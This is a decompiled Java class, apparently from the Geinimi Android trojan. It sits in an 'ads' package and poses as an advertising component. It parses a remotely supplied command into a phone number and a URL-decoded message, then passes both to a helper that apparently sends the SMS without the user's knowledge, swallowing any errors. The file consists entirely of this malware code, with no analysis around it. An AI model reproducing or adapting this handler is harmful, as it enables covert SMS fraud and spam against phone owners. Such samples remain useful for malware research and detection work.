package com.geinimi.ads;

import android.content.Intent;
import com.geinimi.C0000r;
import com.geinimi.c.i;
import java.net.URLDecoder;

public final class l extends Advertisable {
    private String[] b = {"sms_to_phone", "smc_content"};

    protected l(String str) {
        super(str);
    }

    public final boolean b() {
        i.a(a((String) "sms_to_phone"), a((String) "smc_content"));
        return false;
    }

    public final void c() {
        try {
            String substring = this.a.substring(C0000r.u.length());
            a("sms_to_phone", substring.substring(0, substring.indexOf(";")));
            String substring2 = substring.substring(substring.indexOf(";") + 1);
            if (substring2 != null) {
                substring2 = URLDecoder.decode(substring2, "UTF-8");
            }
            a("smc_content", substring2);
        } catch (Exception e) {
        }
    }

    public final int d() {
        return 0;
    }

    public final int e() {
        return 17301647;
    }

    public final Intent f() {
        return null;
    }

    /* access modifiers changed from: protected */
    public final String[] h() {
        return this.b;
    }
}
